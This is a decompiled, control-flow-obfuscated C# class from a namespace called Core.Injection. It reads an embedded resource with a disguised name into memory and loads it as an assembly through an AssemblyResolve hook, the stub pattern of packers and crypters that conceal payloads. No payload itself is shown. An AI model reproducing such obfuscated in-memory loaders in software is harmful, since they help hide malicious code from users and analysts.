using System;
using System.IO;
using System.Reflection;

namespace Core.Injection
{
	internal class Resource
	{
		private static byte[] array;

		public static void setup()
		{
			int num = 1286351296;
			int num2 = 1;
			Stream manifestResourceStream = default(Stream);
			do
			{
				if (num2 == 1286351297 - num)
				{
					new object();
					num2 = 0x4CAC29C2 ^ num;
				}
				if (num2 == 1286351298 - num)
				{
					manifestResourceStream = Assembly.GetCallingAssembly().GetManifestResourceStream("R\u0006");
					num2 = 0x4CAC29C3 ^ num;
				}
				if (num2 == -1286351296 + num)
				{
					num2 = -1286351295 + num;
				}
			}
			while (num2 != -1286351293 + num);
			try
			{
				using (new StreamReader(manifestResourceStream))
				{
					array = new byte[manifestResourceStream.Length];
					manifestResourceStream.Read(array, 1286351296 - num, array.Length);
				}
			}
			finally
			{
				((IDisposable)manifestResourceStream)?.Dispose();
			}
			AppDomain.CurrentDomain.AssemblyResolve += ResolveAssembly;
		}

		public static Assembly ResolveAssembly(object sender, ResolveEventArgs e)
		{
			int num = 1911027466;
			int num2 = 1;
			do
			{
				if (num2 == -1911027465 + num)
				{
					if (e.Name.Contains("Runtime"))
					{
						break;
					}
					num2 = -1911027464 + num;
				}
				if (num2 != (0x71E7F708 ^ num))
				{
					if (num2 == (0x71E7F70A ^ num))
					{
						num2 = 0x71E7F70B ^ num;
					}
					continue;
				}
				return null;
			}
			while (num2 != -1911027463 + num);
			return Assembly.Load(array);
		}
	}
}
